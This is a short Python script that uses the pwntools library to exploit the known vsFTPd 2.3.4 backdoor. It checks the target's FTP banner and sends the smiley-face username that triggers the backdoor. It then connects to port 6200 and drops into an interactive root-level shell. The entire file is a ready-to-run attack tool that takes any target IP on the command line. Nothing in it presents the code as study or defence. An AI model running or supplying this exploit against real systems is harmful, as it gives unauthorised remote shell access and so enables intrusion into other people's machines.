from pwn import *
from sys import argv, exit
from time import sleep

def trigger_backdoor(ip, port=21):
    log.info("Checking FTP Version on {}:{}".format(ip, port))
    io = remote(ip, port)
    io.recvuntil(b"vsFTPd ")
    version = (io.recvuntil(b")")[:-1]).decode()
    
    if version != "2.3.4":
        log.failure(f"[!] Target version {version} is not vulnerable. Exploit requires vsFTPd 2.3.4.")
        io.close()
        exit()
    else:
        log.success("[+] Target is running vsFTPd 2.3.4. Proceeding with backdoor exploit...")
        io.sendline(b"USER hello:)")
        io.sendline(b"PASS hello123")
        io.close()

def get_shell(ip):
    log.info(f"[i] Connecting to backdoor on {ip}:6200...")
    sleep(1)
    
    try:
        io = remote(ip, 6200)
        log.success("[+] Connection successful! You now have shell access.")
        io.interactive()
        io.close()
    except Exception as e:
        log.failure(f"[!] Failed to connect to backdoor: {e}")
        exit()

if __name__ == "__main__":
    if "-host" not in argv:
        log.error("Usage: python3 script.py -host <target_ip> [port]")
        exit()

    target_ip = argv[argv.index("-host") + 1]
    target_port = int(argv[argv.index("-host") + 2]) if len(argv) > 3 else 21

    log.info("[i] Initiating FTP backdoor exploit...")
    trigger_backdoor(target_ip, target_port)
    get_shell(target_ip)

